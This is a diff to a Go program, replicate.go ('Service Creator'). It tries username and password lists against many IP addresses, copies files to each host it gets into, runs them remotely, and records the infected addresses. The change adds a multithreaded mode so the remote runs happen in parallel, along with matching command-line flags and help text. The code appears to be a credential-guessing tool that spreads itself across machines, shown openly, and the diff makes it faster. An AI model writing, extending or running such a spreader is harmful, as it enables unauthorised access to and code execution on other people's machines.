@@ -14,6 +14,7 @@ import (
 var systemOS string = getOS()
 var isVerbose bool = false
 var isDemo bool = false
+var isThreaded bool = false
 var usernames []string
 var passwords []string
 var installedIPs []string
@@ -120,7 +121,11 @@ func transferFiles(ips []string) {
 						if isVerbose {
 							fmt.Println("Files sent")
 						}
-						runRemote(usernames[u], passwords[p], ips[i])
+						if isThreaded {
+							go runRemote(usernames[u], passwords[p], ips[i])
+						} else {
+							runRemote(usernames[u], passwords[p], ips[i])
+						}
 						complete = true
 						break
 					}
@@ -240,13 +245,26 @@ func handleArgs(args []string) bool {
 				passwords = strings.Split(args[i+1], ",")
 			} else if args[i] == "--ignore" || args[i] == "-i" {
 				ignoreIPs = strings.Split(args[i+1], ",")
-			} else if args[i] == "-v" || args[i] == "verbose" {
-				isVerbose = true
+			} else if args[i] == "-v" || args[i] == "--verbose" {
+				if !isThreaded {
+					isVerbose = true
+				} else {
+					fmt.Println("Error: verbose is not compatible with multithreading")
+					return false
+				}
+			} else if args[i] == "-m" || args[i] == "--multi" {
+				if !isVerbose {
+					isThreaded = true
+				} else {
+					fmt.Println("Error: verbose is not compatible with multithreading")
+					return false
+				}
 			} else if args[i] == "--help" || args[i] == "-h" {
 				fmt.Println("Service Creator\n\n" +
 					"usage: go run replicate.go -u [username] -p [password] [args]\n" +
 					"-v or --verbose			|	Enable verbose output\n" +
 					"-i [IPs] or --ignore [IPS]	|	Specify a list of IPs to ignore, separated by commas\n" +
+					"-m or --multi			|	Run in multithreaded mode. Not compatible with verbose.\n" +
 					"--help or -h			|	Display this help menu\n" +
 					"--password-list [PASSWORDS]	|	Specify a list of passwords, separated by commas\n" +
 					"--user-list [USERS]		|	Specify a list of users, separated by commas",
